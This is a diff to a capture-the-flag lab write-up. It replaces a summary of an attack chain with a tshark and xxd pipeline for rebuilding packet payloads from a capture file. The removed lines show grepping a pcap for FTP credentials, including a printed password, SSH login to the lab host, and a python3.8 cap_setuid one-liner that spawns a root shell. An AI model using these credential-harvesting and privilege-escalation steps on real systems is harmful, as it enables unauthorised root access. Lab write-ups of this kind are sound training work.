@@ -151,15 +151,13 @@ mv /home/kali/Downloads/0.pcap .
 
 *Figure 11: File relocation via the mv command to consolidate target resources within the operational workspace.*
 
-This file transfer confirms operational data centralisation, ensuring the intercepted packet capture traces can be smoothly investigated locally for cleartext information.
+#### Advanced Raw Packet Stream Inspection (Sequence 1)
+To reconstruct the raw packet communications cached within the `0.pcap` trace file without using heavy GUI network analysis tools, an advanced data pipeline was assembled in the terminal. The binary payloads of the TCP transport layer streams were extracted dynamically using `tshark`, muted for network descriptor noise, and piped directly into `xxd` running reverse plaintext hex stream parsing modes (`xxd -ps -r`).
 
-#### IDOR Boundary Exploitation & Credential Harvesting
-- **Credential Extraction:** `strings 0.pcap | grep -E "USER|PASS"` → `nathan:Buck3tH4TF0RM3!`
-- **Initial Access:** FTP login and download of `user.txt`.
+```bash
+tshark -r 0.pcap -Tfields -e tcp.payload 2>/dev/null | xxd -ps -r
+```
 
-### Phase 3: Privilege Escalation
-- **SSH Access:** `ssh nathan@10.129.68.112`
-- **Enumeration:** `getcap -r / 2>/dev/null | grep python` → `/usr/bin/python3.8 = cap_setuid+ep`
-- **Exploitation:** `python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'`
-- **Root Confirmation:** `whoami` → `root`
+![Hexadecimal Stream Reconstruction Sequence 1](./assets/Extraccion_archivo0.png)
+
 
